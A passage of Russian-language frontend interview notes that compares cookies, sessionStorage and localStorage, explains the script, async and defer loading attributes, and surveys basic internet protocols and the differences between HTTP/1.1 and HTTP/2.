**Хранение:**  
- Только **на клиенте** (данные не отправляются на сервер).  
- Объем: **~5–10 МБ** на домен (зависит от браузера).  

**Срок жизни:**  
- Удаляется при **закрытии вкладки/браузера**.  

**Доступ:**  
- Через API: `sessionStorage.setItem()`, `sessionStorage.getItem()`.  

**Пример:**  
```javascript
// Сохранение
sessionStorage.setItem('theme', 'dark');

// Чтение
console.log(sessionStorage.getItem('theme')); // "dark"
```

**Когда использовать:**  
- Временные данные для текущей сессии (например, форма с многостраничным вводом).  

---

###### **3. localStorage**  
**Хранение:**  
- Только **на клиенте** (как `sessionStorage`, но без привязки к сессии).  
- Объем: **~5–10 МБ** на домен.  

**Срок жизни:**  
- Сохраняется **навсегда**, пока не будет очищен вручную или через код.  

**Доступ:**  
- Аналогичен `sessionStorage`: `localStorage.setItem()`, `localStorage.getItem()`.  

**Пример:**  
```javascript
// Сохранение
localStorage.setItem('language', 'ru');

// Чтение
console.log(localStorage.getItem('language')); // "ru"
```

**Когда использовать:**  
- Постоянные настройки пользователя (тема, язык).  
- Кэширование данных для оффлайн-работы.  

---

###### **Сравнительная таблица**
| Характеристика       | Cookie                  | sessionStorage         | localStorage          |
|----------------------|-------------------------|------------------------|-----------------------|
| **Объем**           | ~4 КБ                  | 5–10 МБ               | 5–10 МБ              |
| **Срок жизни**      | Задается вручную       | До закрытия вкладки    | Бессрочно            |
| **Доступ с сервера**| Да (через заголовки)   | Нет                    | Нет                  |
| **API**             | `document.cookie`       | `sessionStorage`       | `localStorage`       |
| **Использование**   | Аутентификация         | Временные данные       | Постоянные данные    |

---

###### **Как выбрать?**  
1. **Нужно отправить данные на сервер?** → `cookie`.  
2. **Хранить данные только в текущей вкладке?** → `sessionStorage`.  
3. **Сохранить настройки пользователя надолго?** → `localStorage`.  

**Важно:**  
- Для безопасности **не храните** пароли/токены в `localStorage` (уязвимо для XSS-атак).  
- Для больших данных (например, кэша) используйте **IndexedDB**.
##### Объясните разницу между `<script>`, `<script async>` и `<script defer>`.[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D0%BE%D0%B1%D1%8A%D1%8F%D1%81%D0%BD%D0%B8%D1%82%D0%B5-%D1%80%D0%B0%D0%B7%D0%BD%D0%B8%D1%86%D1%83-%D0%BC%D0%B5%D0%B6%D0%B4%D1%83-script-script-async-%D0%B8-script-defer "Прямая ссылка на объясните-разницу-между-script-script-async-и-script-defer")

https://developer.mozilla.org/ru/docs/Web/HTML/Reference/Elements/script

https://learn.javascript.ru/script-async-defer

- `<script>` - отрисовка HTML блокируется, скрипт извлекается и выполняется немедленно, отрисовка HTML возобновляется после окончания выполнения скрипта.
- `<script async>` - скрипт будет получен и обработан параллельно с отрисовкой HTML, его выполнение закончится как только это будет возможно (обычно до того, как закончилась отрисовка HTML). Используйте `async` тогда, когда скрипт не зависит от других скриптов на странице, например для аналитики.
- `<script defer>` - скрипт будет получен параллельно с отрисовкой HTML, его выполнение произойдет после того, как вся страница будет загружена. Если таких скриптов несколько, то каждый из них будет исполнятся в том порядке, в котором они расположены в документе. Если скрипту нужен полностью распарсеный DOM, то атрибут `defer` обеспечит уверенность в том, что на момент отработки скрипта весь HTML отрисован. Нет особой разницы со скриптами, расположенными перед тегом `<body>`. Отложенный скрипт не должен содержать `document.write`.

Примечание: Атрибуты `async` и `defer` игнорируются, если у тега `<script>` нет атрибута `src`.

Вот подробное сравнение атрибутов **`async`** и **`defer`** для загрузки скриптов в HTML:

---

###### **1. Обычная загрузка скрипта (без атрибутов)**
```html
<script src="script.js"></script>
```
**Поведение:**
- Браузер **останавливает парсинг HTML**, пока скрипт не загрузится и не выполнится.
- **Блокирующий** процесс рендеринга страницы.

**Когда использовать:**  
Если скрипт критически важен для отображения контента (например, полифиллы для старых браузеров).

---

###### **2. Атрибут `async` (асинхронная загрузка)**
```html
<script async src="script.js"></script>
```
**Поведение:**
1. Скрипт загружается **параллельно** с парсингом HTML.
2. Как только скрипт загружен, он **немедленно выполняется**, приостанавливая парсинг HTML.
3. **Порядок выполнения**: Не гарантируется (кто загрузился первым, тот и выполнился).

**Когда использовать:**  
Для независимых скриптов, которые не требуют взаимодействия с DOM (например, аналитика, счетчики).

**Пример:**  
```html
<!-- Google Analytics -->
<script async src="https://www.google-analytics.com/analytics.js"></script>
```

---

###### **3. Атрибут `defer` (отложенная загрузка)**
```html
<script defer src="script.js"></script>
```
**Поведение:**
1. Скрипт загружается **параллельно** с парсингом HTML.
2. Выполняется **после полной загрузки HTML**, перед событием `DOMContentLoaded`.
3. **Порядок выполнения**: Сохраняется (скрипты выполняются в том порядке, в котором объявлены в HTML).

**Когда использовать:**  
Для скриптов, которым нужен доступ к DOM, но которые могут ждать загрузки всей страницы (например, инициализация виджетов).

**Пример:**  
```html
<script defer src="app.js"></script>
<script defer src="widget.js"></script> 
<!-- Гарантировано выполнится после app.js -->
```

---

###### **Сравнительная таблица**
| Характеристика      | Без атрибутов       | `async`                     | `defer`                     |
|---------------------|---------------------|-----------------------------|-----------------------------|
| **Загрузка**        | Блокирует HTML      | Параллельная                | Параллельная                |
| **Выполнение**      | Сразу после загрузки| Сразу после загрузки        | После загрузки HTML         |
| **Порядок**         | По порядку в HTML   | Случайный (кто первый)      | По порядку в HTML           |
| **Влияние на рендер**| Блокирует          | Может блокировать           | Не блокирует               |
| **Использование**   | Критичные скрипты   | Независимые скрипты         | Скрипты, зависящие от DOM  |

---

###### **Как выбрать?**
1. **`async`** – если скрипт **не зависит от DOM** и других скриптов (аналитика, реклама).  
2. **`defer`** – если скрипту **нужен DOM**, но он может подождать (основной код приложения).  
3. **Без атрибутов** – только для скриптов, которые должны выполниться **до отображения страницы** (например, полифиллы).

---

###### **Визуализация загрузки**
```
HTML Parsing: |=============================|
Без атрибутов:   |----загрузка----|выполнение|
async:            |----загрузка----|выполнение| (в случайном порядке)
defer:            |----загрузка----|       |выполнение| (после HTML, по порядку)
```

---

###### **Важно!**
- Для **модульных скриптов** (ES6) используйте `<script type="module">` – они по умолчанию работают как `defer`.
- **Старайтесь избегать** блокирующих скриптов без `async/defer` – они замедляют загрузку страницы.
##### Интернет протоколы

Вообще, протоколов передачи данных существует довольно много. Мы же поговорим о самых основных.

###### IP — Internet Protocol

Первым объединил отдельные ПК в единую сеть. Можно сказать, что этот протокол является наиболее простым. А еще он ненадежен, ведь он не подтверждает доставку пакетов получателю, как и не контролирует целостность данных. По IP-протоколу передача данных происходит без установки соединения.

Главная задача IP — маршрутизация датаграмм, то есть речь идет об определении пути следования данных по узлам сети. До сего дня наиболее популярной версией являлся **IPv4** с 32-битными адресами. Но, как известно, 4.29 млрд IPv4-адресов — это много, но [уже давно недостаточно](https://otus.ru/nest/post/637/). Поэтому существует [IPv6](https://otus.ru/nest/post/784/), который призван решить проблему переполнения адресов.

###### TCP/IP — Transmission Control Protocol/Internet Protocol

Это уже стек протоколов TCP и IP. TCP обеспечивает и контролирует передачу данных и следит за надежностью и целостностью. IP отвечает за маршрутизацию. Протокол TCP нередко используется другими, более комплексными протоколами.

###### UDP — User Datagram Protocol

Обеспечивает передачу данных, не создавая предварительного соединения между ними. UDP считают недостаточно надежным, т. к. пакеты могут не только не дойти, но и продублироваться либо прийти не по порядку.

Но есть и преимущество: скорость доставки данных. Именно поэтому в приложениях, особо чувствительных к сетевым задержкам, нередко применяют UDP.

###### FTP — File Transfer Protocol

Служит для передачи файлов. Этот протокол не новый -- его успешно применяли задолго до появления IP. Он и сегодня используется при организации удаленного доступа к хостингам.

Надежен, гарантирует передачу данных, функционирует по принципу клиент-серверной архитектуры. Для работы с файловой системой сервера пользователь проходит аутентификацию (анонимный вариант тоже возможен), после чего получает доступ.

###### DNS

DNS представляет собой не только систему доменных имён (Domain Name System). Это еще и протокол, без которого данная система работать бы не смогла. Протокол дает возможность клиентским компьютерам запрашивать у DNS-сервера IP-адрес какого-нибудь сайта, плюс он помогает осуществлять обмен БД между серверами DNS. В работе системы также используются протоколы TCP и UDP.

###### HTTP — HyperText Transfer Protocol

Поначалу это был протокол передачи HTML-документов. Сейчас он задействуется в целях передачи произвольных данных в сети. Считается протоколом клиент-серверного взаимодействия без сохранения промежуточного состояния. В качестве клиента обычно выступает web-браузер, хотя это может быть и поисковый робот. При обмене информацией протокол HTTP чаще всего использует TCP/IP.

Протокол HTTP имеет расширение HTTPS, поддерживающее шифрование. В нем данные уже передаются поверх криптографического протокола TLS.

###### NTP — Network Time Protocol

На самом деле, не все протоколы передачи используются для обмена классического вида информацией. Протокол NTP служит для синхронизации локальных часов устройства со временем в глобальной/локальной сети. NTP задействует алгоритм Марзулло, в результате чего выбирается наиболее точный источник времени. А еще NTP работает поверх UDP, что позволяет ему достигать максимальной скорости передачи данных. В целом протокол довольно устойчив к изменениям задержек в глобальной/локальной сети.

###### SSH — Secure SHell

Обеспечивает удаленное управление ОС с применением TCP. В SSH шифруют весь трафик, при этом сохраняется возможность выбора алгоритма шифрования. Это необходимо для передачи паролей и прочей важной информации.

А еще SSH дает возможность обрабатывать любые другие протоколы передачи данных. Таким образом, кроме удаленного управления компьютером, через этот протокол вы сможете пропускать любые файлы либо даже аудио/видео-потоки.

SSH обычно применяют при работе с хостингами (клиент получает возможность удаленно подключиться к серверу и работать с ним).

##### HTTP 2 vs HTTP 1


| **Характеристика**       | **HTTP/1.1**                          | **HTTP/2**                          |
|--------------------------|--------------------------------------|-------------------------------------|
| **Мультиплексирование**  | ❌ Нет (6-8 параллельных соединений) | ✅ Одно соединение, много потоков   |
| **Сжатие заголовков**    | ❌ Текст (избыточность)              | ✅ Бинарный формат + HPACK          |
| **Приоритизация**        | ❌ Нет (очередь запросов)            | ✅ Зависимости и веса потоков       |
| **Server Push**          | ❌ Только клиентские запросы         | ✅ Сервер отправляет ресурсы заранее|
| **Бинарный протокол**   | ❌ Текстовый (читаемый, но медленный)| ✅ Бинарные фреймы (быстрее)        |
| **Задержки (Latency)**   | Выше (head-of-line blocking)         | Ниже (параллельные потоки)          |

---

###### **1. Мультиплексирование (Multiplexing)**
- **HTTP/1.1**:  
  - Ограничение на параллельные соединения (обычно 6-8 на домен).  
  - **Head-of-Line Blocking**: Если один запрос тормозит, остальные ждут.  
  ```mermaid
  graph LR
    A[Запрос 1] --> B[Запрос 2] --> C[Запрос 3]
  ```
- **HTTP/2**:  
  - Одно TCP-соединение, но множество **потоков (streams)**.  
  - Запросы не блокируют друг друга.  
  ```mermaid
  graph TD
    A[Поток 1] --> B[Поток 2]
    A --> C[Поток 3]
  ```

---

###### **2. Сжатие заголовков**
- **HTTP/1.1**:  
  Заголовки передаются в виде текста (например, `Content-Type: text/html`), что избыточно.  
- **HTTP/2**:  
  Использует **HPACK** для сжатия заголовков (уменьшает трафик на 50-90%).  

---

###### **3. Server Push**
- **HTTP/1.1**:  
  Сервер ждет запросов от клиента (например, браузер сначала запрашивает HTML, потом CSS/JS).  
- **HTTP/2**:  
  Сервер может **сам отправить CSS/JS/изображения** до того, как клиент их запросит.  
  ```mermaid
  sequenceDiagram
    Сервер->>Клиент: HTML + CSS (без запроса)
  ```

---

###### **4. Бинарный протокол**
- **HTTP/1.1**: Текстовый (например, `GET /index.html HTTP/1.1`).  
- **HTTP/2**: Бинарные фреймы (оптимизированы для машинной обработки).  

---

###### **Когда использовать HTTP/2?**
- **Да**: Веб-приложения с множеством ресурсов (SPA, медиа).  
- **Нет**: Простые API (REST/gRPC), где мультиплексирование не критично.  

---

###### **Примеры**
###### HTTP/1.1 (запросы по очереди):
```
GET /style.css HTTP/1.1
GET /script.js HTTP/1.1
```
###### HTTP/2 (бинарные фреймы):
```
0x00 0x01 0x02... (оптимизированные данные)
```

**Итог**: HTTP/2 уменьшает задержки и ускоряет загрузку страниц, но требует поддержки сервера (nginx, Cloudflare) и HTTPS.
